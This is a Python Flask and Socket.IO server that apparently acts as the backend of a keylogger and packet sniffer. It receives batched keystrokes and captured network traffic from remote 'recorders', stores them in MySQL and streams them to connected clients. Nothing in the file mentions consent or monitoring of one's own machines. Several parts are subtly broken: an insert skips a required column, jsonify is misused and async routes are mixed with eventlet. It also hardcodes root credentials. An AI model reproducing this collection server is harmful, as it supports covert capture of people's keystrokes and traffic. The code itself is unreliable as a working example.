from flask import Flask, jsonify, request
import mysql.connector
from mysql.connector import Error
import socketio
import eventlet


app = Flask(__name__)
sio = socketio.Server(cors_allowed_origins="*", logger=True, async_mode="eventlet")

# MySQL configuration (update with your credentials)
db_config = {
    "host": "localhost",
    "user": "root",  # Replace with your MySQL username
    "password": "root",  # Replace with your MySQL password
    "database": "keystroke_logger",
}


# Function to initialize the database and table
def init_db():
    try:
        conn = mysql.connector.connect(
            host=db_config["host"],
            user=db_config["user"],
            password=db_config["password"],
        )
        cursor = conn.cursor()
        cursor.execute(f"CREATE DATABASE IF NOT EXISTS {db_config['database']}")
        cursor.execute(f"USE {db_config['database']}")
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS keystrokes (
                id INT AUTO_INCREMENT PRIMARY KEY,
                host VARCHAR(100) NOT NULL,
                timestamp DATETIME NOT NULL,
                key_pressed VARCHAR(50) NOT NULL
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS packets (
                id INT AUTO_INCREMENT PRIMARY KEY,
                interface VARCHAR(100),
                protocol VARCHAR(10),
                src_ip VARCHAR(100) NOT NULL,
                dest_ip VARCHAR(100) NOT NULL,
                src_mac VARCHAR(100) NOT NULL,
                dest_mac VARCHAR(100) NOT NULL,
                src_port VARCHAR(100),
                dest_port VARCHAR(100),
                timestamp DATETIME NOT NULL
            )
        """)
        conn.commit()
        print("Database and table initialized successfully.")
    except Error as e:
        print(f"Error initializing database: {e}")
    finally:
        if cursor:
            cursor.close()
        if conn and conn.is_connected():
            conn.close()


# Function to get a database connection
def get_db_connection():
    return mysql.connector.connect(**db_config)


# Function to save multiple keystrokes to the database
def save_keystrokes(keystrokes):
    conn = get_db_connection()
    cursor = conn.cursor()
    query = "INSERT INTO keystrokes (timestamp, key_pressed) VALUES (%s, %s)"
    cursor.executemany(query, [(k["timestamp"], k["key"]) for k in keystrokes])
    conn.commit()
    cursor.close()
    conn.close()
    sio.emit("NewKeystrokes", jsonify(keystrokes))


async def save_packets(packets):
    conn = get_db_connection()
    cursor = conn.cursor()
    query = "INSERT INTO packets (interface, protocol, src_ip, dest_ip, src_mac, dest_mac, src_port, dest_port, timestamp) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)"
    cursor.executemany(
        query,
        [
            (
                k["interface"],
                k["protocol"],
                k["src"]["ip"],
                k["dest"]["ip"],
                k["src"]["mac"],
                k["dest"]["mac"],
                k["src"]["port"],
                k["dest"]["port"],
                k["timestamp"],
            )
            for k in packets
        ],
    )
    conn.commit()
    cursor.close()
    conn.close()
    sio.emit(event="NewPackets", data=packets)


# Route to receive batched keystrokes from the recorder
@app.route("/record", methods=["POST"])
def record_keystroke():
    data = request.get_json()
    if not isinstance(data, list):
        return jsonify({"error": "Expected a list of keystrokes"}), 400
    save_keystrokes(data)
    return jsonify({"message": f"{len(data)} keystrokes recorded"}), 201


# Route to receive batched packets from the recorder
@app.route("/packet", methods=["POST"])
async def record_packets():
    data = request.get_json()
    if not isinstance(data, list):
        return jsonify({"error": "Expected a list of packets"}), 400
    await save_packets(data)
    return jsonify({"message": f"{len(data)} Packets recorded"}), 201


# Route to retrieve all keystrokes
@app.route("/keystrokes", methods=["GET"])
def get_keystrokes():
    conn = get_db_connection()
    cursor = conn.cursor(dictionary=True)
    cursor.execute("SELECT * FROM keystrokes ORDER BY timestamp DESC")
    keystrokes = cursor.fetchall()
    cursor.close()
    conn.close()
    return jsonify(keystrokes)


# Route to clear all keystrokes
@app.route("/clear", methods=["POST"])
def clear_keystrokes():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM keystrokes")
    conn.commit()
    cursor.close()
    conn.close()
    return jsonify({"message": "Keystrokes cleared"})


@sio.event
def connect(sid, environ):
    print("connect with :", sid)


@sio.event
def disconnect(sid, environ):
    print("connect with :", sid)


@sio.event
def NewPackets(sid, data):
    sio.emit("NewPackets", data, skip_sid=sid)


# Initialize the database when the app starts
with app.app_context():
    init_db()

if __name__ == "__main__":
    eventlet.wsgi.server(eventlet.listen(("", 5000)), socketio.WSGIApp(sio, app))
